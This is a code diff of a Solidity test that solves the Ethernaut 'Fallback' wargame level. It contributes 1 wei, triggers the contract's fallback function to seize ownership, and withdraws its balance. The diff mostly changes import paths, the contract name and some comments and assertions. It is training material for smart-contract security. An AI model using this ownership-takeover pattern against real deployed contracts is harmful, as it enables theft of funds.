@@ -1,11 +1,11 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../01-Fallback/FallbackFactory.sol";
-import "../Ethernaut.sol";
-import "./utils/vm.sol";
+import "src/01-Fallback/FallbackFactory.sol";
+import "src/Ethernaut.sol";
+import "../utils/vm.sol";
 
-contract FallbackTest is DSTest {
+contract C_FallbackTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
     address eoaAddress = address(100);
@@ -32,27 +32,22 @@ contract FallbackTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Contribute 1 wei - verify contract state has been updated
-        ethernautFallback.contribute{value: 1 wei}();
-        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
+        // first contribution
+        ethernautFallback.contribute{value : 1 wei}();
 
-        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
-        payable(address(ethernautFallback)).call{value: 1 wei}("");
-        // Verify contract owner has been updated to 0 address
-        assertEq(ethernautFallback.owner(), eoaAddress);
+        // take ownership
+        address(ethernautFallback).call{value: 1 wei}("");
 
-        // Withdraw from contract - Check contract balance before and after
+        // withdraw
         emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
         ethernautFallback.withdraw();
         emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
-
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
         
-
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+        assertTrue(levelSuccessfullyPassed);
     }
 }
